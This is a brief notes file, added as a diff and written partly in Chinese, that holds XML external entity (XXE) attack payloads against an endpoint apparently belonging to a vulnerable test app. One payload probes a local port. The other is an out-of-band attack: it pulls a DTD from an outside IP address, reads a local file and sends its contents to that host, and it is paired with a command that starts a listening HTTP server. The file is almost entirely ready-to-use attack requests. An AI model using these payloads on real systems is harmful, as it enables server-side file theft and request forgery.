@@ -1,0 +1,23 @@
+XXE1
+POST /xxe//SAXBuilder/vuln HTTP/1.1
+
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://127.0.0.1:8888">]><root>&xxe;</root>
+
+
+XXE2获取文件内容
+POST /xxe/SAXBuilder/vuln HTTP/1.1
+
+<!DOCTYPE message [
+    <!ENTITY % ext SYSTEM "http://114.132.198.130:8000/ext.dtd">
+    %ext;
+]>
+<message></message>
+
+ext.dtd的内容如下：
+<!ENTITY % file SYSTEM "file:///tmp/gcf.txt">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://114.132.198.130:8000/%file;'>">
+%eval;
+%error;
+python3 -m http.server
+
+
